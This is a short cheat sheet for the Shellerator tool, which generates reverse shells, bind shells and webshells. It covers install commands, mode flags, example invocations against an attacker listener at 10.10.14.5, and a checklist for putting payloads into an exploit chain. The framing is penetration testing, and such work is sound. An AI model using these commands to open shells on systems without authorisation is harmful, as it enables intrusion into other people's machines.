# Shellerator Mode Selection & CLI Examples

## Install (current upstream)

```bash
pipx install git+https://github.com/ShutdownRepo/shellerator
# or
uv tool install git+https://github.com/ShutdownRepo/shellerator
```

## Core Modes

- `-r` reverse shell (default)
- `-b` bind shell
- `-w` webshell generation
- `-l` list supported shell types

## Practical Examples

```bash
# list available payload types
shellerator -l

# reverse bash shell
shellerator -r -t bash -lh 10.10.14.5 -lp 4444

# reverse powershell shell
shellerator -r -t powershell -lh 10.10.14.5 -lp 9001

# bind netcat shell
shellerator -b -t nc -lp 5555

# php webshell
shellerator -w -t php
```

If required options are omitted, shellerator opens TUI flow and prompts interactively.

## Mode Selection Guide

| Need | Mode |
|---|---|
| Target can reach attacker outbound | `-r` reverse |
| Attacker can reach target inbound | `-b` bind |
| File upload web foothold | `-w` webshell |

## Validation Checklist

Before copying payload to exploit chain:
- Confirm LHOST reachable from target network segment.
- Confirm listener already running.
- Confirm payload language/runtime exists on target.
- Test with harmless command channel first.

## Source Pointers

- Upstream README usage section (current args: `-b|-r|-w`, `-lh`, `-lp`, `-t`)
- Project notes about TUI fallback and payload catalogs
